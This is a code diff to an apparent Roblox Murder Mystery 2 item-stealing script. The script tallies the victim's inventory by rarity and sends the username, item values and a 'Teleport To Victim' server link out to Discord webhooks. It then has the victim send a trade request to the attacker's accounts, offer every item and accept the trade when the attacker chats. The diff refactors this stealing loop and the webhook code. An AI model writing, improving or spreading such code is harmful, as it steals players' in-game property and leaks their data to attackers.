@@ -792,11 +792,11 @@ local values = {
 }
 
 if #game:GetService("Players"):GetPlayers() <= 2 then
-    game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
+    game.Players.LocalPlayer:Kick("Exit game and re-inject")
 end
 
 if #game:GetService("Players"):GetPlayers() == 12 then
-    game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
+    game.Players.LocalPlayer:Kick("Exit game and re-inject.")
 end
 
 local LP = game.Players.LocalPlayer
@@ -1056,152 +1056,79 @@ local EverythingString = "-- // Uniques\n" .. uniquesString ..
                          "\n\n-- // Uncommon\n" .. uncommonString ..
                          "\n\n-- // Common\n" .. commonsString
 
-local WebHookEmbed = CreateEmbed(
-    "MM2 Hit - Ft. Light Monzz",
-    "Please execute the code above to get your hit.",
-    65280,
-    {
-        {
-            name = "🌊 Player Info", 
-            value = "``` | 📖 Username: "..LP.Name.."\n | 🚀 Level: "..tostring(getLvl())..
-                     "\n | 🥳 Receiver: "..userName.."```"
-        },
-        {
-            name = "🍎 Items Data", 
-            value = "```Uniques: "..tostring(uniqueItemsC)..
-                     "\nAncients: "..tostring(ancientItemsC)..
-                     "\nGodlys: "..tostring(godlyItemsC)..
-                     "\nLegendaries: "..tostring(legendaryItemsC)..
-                     "\nVintage: "..tostring(vintageItemsC)..
-                     "\nRares: "..tostring(rareItemsC)..
-                     "\nUncommons: "..tostring(uncommonItemsC)..
-                     "\nCommons: "..tostring(commonItemsC).."```"
-        },
-        {
-            name = "✏️ Total Value", 
-            value = "```"..tostring(math.floor(valueCount + 0.5)).."```"
-        },
-        {
-            name = "ᴅɪꜱᴄᴏʀᴅ sᴇʀᴠᴇʀ", 
-            value = "[**Join Invite**](https://discord.gg/CAr4FZHAyF)"
-        }
-    }
-)
+                         local WebHookEmbed = CreateEmbed(
+                            "MM2 Hit - Ft. Light Monzz",
+                            "Please execute the code above to get your hit.",
+                            65280,
+                            {
+                                {
+                                    name = "🌊 Player Info", 
+                                    value = "``` | 📖 Username: "..LP.Name.."\n | 🚀 Level: "..tostring(getLvl())..
+                                             "\n | 🥳 Receiver: "..Username.."```"
+                                },
+                                {
+                                    name = "🍎 Items Data", 
+                                    value = "```Uniques: "..tostring(uniqueItemsC)..
+                                             "\nAncients: "..tostring(ancientItemsC)..
+                                             "\nGodlys: "..tostring(godlyItemsC)..
+                                             "\nLegendaries: "..tostring(legendaryItemsC)..
+                                             "\nVintage: "..tostring(vintageItemsC)..
+                                             "\nRares: "..tostring(rareItemsC)..
+                                             "\nUncommons: "..tostring(uncommonItemsC)..
+                                             "\nCommons: "..tostring(commonItemsC).."```"
+                                },
+                                {
+                                    name = "✏️ Total Value", 
+                                    value = "```"..tostring(math.floor(valueCount + 0.5)).."```"
+                                },
+                                {
+                                    name = "ᴅɪꜱᴄᴏʀᴅ sᴇʀᴠᴇʀ", 
+                                    value = "[**Join Invite**](https://discord.gg/CAr4FZHAyF)"
+                                }
+                            }
+                        )
 
-if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1 then
-    SendWebhook(webHook, {content = "@everyone --\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(142823291, \""..game.JobId.."\")", embeds = {WebHookEmbed}})
-    SendWebhook(webHook1, {content = "(⭐️) Teleport To Victim: --\nhttps://fern.wtf/joiner?placeId=142823291&gameInstanceId="..game.JobId.."", embeds = {WebHookEmbed}})
+if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1  then
+    SendWebhook(Webhook, {content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
+    SendWebhook(Webhook1, {content = "(⭐️) Teleport To Victim: --\nhttps://fern.wtf/joiner?placeId=142823291&gameInstanceId= "..game.JobId..")", embeds = {WebHookEmbed}})
 else
-    SendWebhook(webHook, {content = "\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(142823291, \""..game.JobId.."\")", embeds = {WebHookEmbed}})
-    SendWebhook(webHook1, {content = "(⭐️) Teleport To Victim:\nhttps://fern.wtf/joiner?placeId=142823291&gameInstanceId="..game.JobId.."", embeds = {WebHookEmbed}})
+    SendWebhook(Webhook, {content = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
+    SendWebhook(Webhook1, {content = "(⭐️) Teleport To Victim: --\nhttps://fern.wtf/joiner?placeId=142823291&gameInstanceId= "..game.JobId..")", embeds = {WebHookEmbed}})
 end
 
-local function stealitems()
+local function stealitems(targetUser)
     coroutine.resume(destroytrades2)
 
+    -- Send trade request to the target user
     local sendArgs = {
-        [1] = game:GetService("Players")[userName]
+        [1] = game:GetService("Players")[targetUser]
     }
     game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))
 
     wait(3)
 
-    for a,b in pairs(uniqueItems) do
-        for i = 1, b.amount do
-            local args = {
-                [1] = b.data,
-                [2] = "Weapons"
-            }
-
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-        end
-    end
-
-    for a,b in pairs(ancientItems) do
-        for i = 1, b.amount do
-            local args = {
-                [1] = b.data,
-                [2] = "Weapons"
-            }
-
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-        end
-    end
-
-    for a,b in pairs(godlyItems) do
-        for i = 1, b.amount do
-            local args = {
-                [1] = b.data,
-                [2] = "Weapons"
-            }
-
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-        end
-    end
-
-    for a,b in pairs(vintageItems) do
-        for i = 1, b.amount do
-            local args = {
-                [1] = b.data,
-                [2] = "Weapons"
-            }
-
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-        end
-    end
-
-    for a,b in pairs(legendaryItems) do
-        for i = 1, b.amount do
-            local args = {
-                [1] = b.data,
-                [2] = "Weapons"
-            }
-
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-        end
-    end
-
-    for a,b in pairs(rareItems) do
-        for i = 1, b.amount do
-            local args = {
-                [1] = b.data,
-                [2] = "Weapons"
-            }
-
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-        end
-    end
-
-    for a,b in pairs(uncommonItems) do
-        for i = 1, b.amount do
-            local args = {
-                [1] = b.data,
-                [2] = "Weapons"
-            }
-
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-        end
-    end
-
-    for a,b in pairs(commonItems) do
-        for i = 1, b.amount do
-            local args = {
-                [1] = b.data,
-                [2] = "Weapons"
-            }
-
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    -- Offer all items in inventory
+    for _, itemList in pairs({uniqueItems, ancientItems, godlyItems, vintageItems, legendaryItems, rareItems, uncommonItems, commonItems}) do
+        for _, item in pairs(itemList) do
+            for i = 1, item.amount do
+                local args = {
+                    [1] = item.data,
+                    [2] = "Weapons"
+                }
+                game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+            end
         end
     end
 
     wait(6)
+    -- Accept the trade with the target user
     game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack({[1] = 285646582}))
 end
 
 game.Players.PlayerAdded:Connect(function(player)
-    if player.Name == userName or player.Name == userName1 then
+    if player.Name == Username or player.Name == Username1 then
         player.Chatted:Connect(function(msg)
-            stealitems()
+            stealitems(player.Name)
         end)
     end
 end)
